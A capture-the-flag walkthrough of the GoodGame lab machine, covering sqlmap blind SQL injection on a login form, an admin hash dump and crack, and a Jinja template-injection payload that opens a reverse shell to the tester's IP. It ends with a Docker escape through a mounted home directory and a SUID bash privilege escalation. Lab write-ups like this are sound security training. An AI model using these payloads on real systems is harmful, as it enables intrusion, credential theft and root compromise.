# Box: GoodGame

> Damiano Gubiani | 26/11/2025

export the box ip

```bash
export IP='10.10.11.130'
```

# Enumeration

running nmap for open ports

command:

```bash
sudo nmap -sS -sC -oN nmap/scan -vv -T4 $IP
```

output:

```
# Nmap 7.95 scan initiated Wed Nov 26 06:32:33 2025 as: /usr/lib/nmap/nmap -sS -sC -oN nmap/scan -vv -T4 10.10.11.130
Nmap scan report for 10.10.11.130
Host is up, received reset ttl 63 (0.15s latency).
Scanned at 2025-11-26 06:32:34 EST for 6s
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
|_http-title: GoodGames | Community and Store
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS POST

Read data files from: /usr/share/nmap
# Nmap done at Wed Nov 26 06:32:40 2025 -- 1 IP address (1 host up) scanned in 6.80 seconds
```

# WebApp

after connecting to the weppage we are greeted with what it seems a game selling website

![](screen/Pasted%20image%2020251126154846.png)

doing standard enumeration i didnt found nothing interesting.

i started burpsuite and activeded the intercept mode when i initiate a login to the web site to capture the request for sqlmap to start attacking it

```html
POST /login HTTP/1.1
Host: 10.10.11.130
Content-Length: 35
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.11.130
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.130/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

email=aaa%40aaa&password=aaaa
```

we save this request as _req1_ and we pass it trought sqlmap with the _-r_ parameter

command:

```
sqlmap -r req1 --batch
```

after letting the program run for a while we found an injection point in the _email_ field

```
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 8779 FROM (SELECT(SLEEP(5)))SQMx) AND 'AQIE'='AQIE&password=test
---
```

so i started enumerating the DB for potential sensitive information.

after enumerating the tables and databases i run a targeted sqlmap query

command:

```bash
sqlmap -r req1 -D main --sql-query='SELECT email,password FROM user'  --batch
```

with this we found the email and password hash of the admin account

```
[*] admin@goodgames.htb,2b22337f218b2d82dfc3b6f77e7cb8ec
```

we crack the hash of the admin and got a match

> 2b22337f218b2d82dfc3b6f77e7cb8ec : superadministrator

we have admin credential , lets log in to the webapp as admin to check what we can do with this user

# Exploit

after login in i found a redirect to another wep page

> http://internal-administration.goodgames.htb/

so we add this to the /etc/hosts file to connect to it

![](screen/Pasted%20image%2020251126175900.png)

we connect to the machine by reusing the admin credentials.

i tried to run an SSTI ( Server-Side Template Injection ) with success

payload:

```
{{7*7}}
```

output:

![](screen/Pasted%20image%2020251126180023.png)

searching online i found a payload we can use to get a reverse shell on the machine

payload:

```
{{config.__class__.__init__.__globals__['os'].popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"').read()}}
```

in fact after starting a listener and running this payload i got a callback on my machine

![](screen/Pasted%20image%2020251126182132.png)

seing the hostname i can alredy tell we are in a docker enviroment

after doing some standard enumeration i found that a home user is mounted in the docker enviroment

```
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)
```

this means that the user august have its home in the docker as well as the permission , this means that if we modify permission on a file it will remain in its host home 

checking the IP of the docker we can safely assume the host ip is 172.19.0.1

![](screen/Pasted%20image%2020251126183012.png)

lets run a port scan on the 172.19.0.1 to check for open ports

```bash
for i in {1..1024}; do (echo >/dev/tcp/172.19.0.1/$i) &>/dev/null && echo "port $i open"; done
```

theres 2 port open 

- 22 ssh
- 80 http

since we know this box password are being reused we can assume the password for augustus is the same as the admin was

lets connect via ssh

command:

```bash
script /dev/null bash
ssh augustus@172.19.0.2
```

after that we are in the augustus home directory of the host not in a docker enviroment.

# PrivEsc

to become root on the host we alredy know the home directory is mounted in the docker so we can copy a bash binary in the home of augustus and add the root and SUID privilage to the binary

first we copy the binary in the home directory in the docker enviroment than we add the root as owner and we finaly add the SUID attribute to the file

```bash
cp /bin/bash .
chown root:root bash
chmod u+s bash
```

and now we runt the file on the host 

```bash
./bash -p
```


